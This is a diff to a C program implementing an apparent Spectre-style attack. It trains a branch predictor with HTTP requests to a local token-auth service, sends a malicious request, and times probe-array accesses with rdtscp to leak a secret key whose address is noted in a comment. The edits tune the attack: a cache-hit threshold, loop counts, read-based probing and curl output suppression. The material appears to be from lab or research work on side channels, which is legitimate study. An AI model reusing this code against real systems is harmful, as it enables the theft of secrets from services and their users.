@@ -12,13 +12,14 @@
 #define L1_SIZE (WAYS * SETS * LINE_SIZE)
 #define NO_LINES (WAYS * SETS)
 
+#define CACHE_THRESHOLD 100
 #define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
 #define TRAINING_REPS 100
 #define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
 // avg cache fetch time = 30 cycles
 
-int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
+unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
 int main(int argc, char* argv[]) {
     char* attack_id = "2";
     if (argc == 2){
@@ -28,7 +29,7 @@ int main(int argc, char* argv[]) {
 
     int count[SETS] = {0};
     curl_global_init(CURL_GLOBAL_ALL);
-    int loops = 100;
+    int loops = 10;
     while (loops > 0){
         // Train BP
         for(int i = 0; i < TRAINING_REPS; i++){
@@ -71,16 +72,18 @@ void valid_request(){
     if (curl_handle){
         char *data = "username=user1&password=password&id=2";
 
+        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
+
         curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
         curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
 
         curl_easy_perform(curl_handle);
     }
-
+    curl_easy_cleanup(curl_handle);
 }
 
 void bad_request(char *attack_id){
-        CURL *curl_handle;
+    CURL *curl_handle;
     //CURLcode res;
 
     curl_handle = curl_easy_init();
@@ -93,6 +96,7 @@ void bad_request(char *attack_id){
 
         curl_easy_perform(curl_handle);
     }
+    curl_easy_cleanup(curl_handle);
 }
 
 void check_cache_presence(int *count){
@@ -104,13 +108,13 @@ void check_cache_presence(int *count){
             t1 = __rdtscp(&pid);
             _mm_lfence();
 
-            probe_array[i] = 0;
+            pid = probe_array[i];
 
             _mm_lfence();
             t2 = __rdtscp(&pid);
             _mm_lfence();
             
-            if (t2 - t1 < 100){
+            if (t2 - t1 < CACHE_THRESHOLD){
                 present ++;
                 
             }
@@ -123,39 +127,15 @@ void check_cache_presence(int *count){
     printf("%d/%d cache hits\n", present, NO_LINES);
 }
 
-void cache_Measurement(){
-    int total = 0;
-    int tot_presen = 0;
-    int j = 0;
-    while (j < 1000){
-        // PRIME PHASE
-        int present = 0;
-        uint64_t t1, t2;
-        unsigned int pid;
-        for (int j = 0; j < 1000; j++){
-            for (int i = 0; i < L1_SIZE; i++){
-                probe_array[i] = 0;
-            }
-        }
-        printf("Checking Cache Presence...\n");
-        
-        for (int i = 0; i < L1_SIZE; i++){
-            t1 = __rdtscp(&pid);
-            probe_array[i] = 0;
-            t2 = __rdtscp(&pid);
-            if (t2 - t1 < 50){
-                total += t2-t1;
-                tot_presen ++;
-                present ++;
-            }
-        }
-
-        printf("%d/%d cache hits\n", present, L1_SIZE);
-        j++;
-        // PROBE PHASE
-    }
-    printf("avg cache fetch time: %d", total/tot_presen);
+// returns junk so that curl doesnt write to console
+size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
+{
+    (void)buffer;
+    (void)userp;
+    return size * nmemb;
 }
+
+
 
 
 
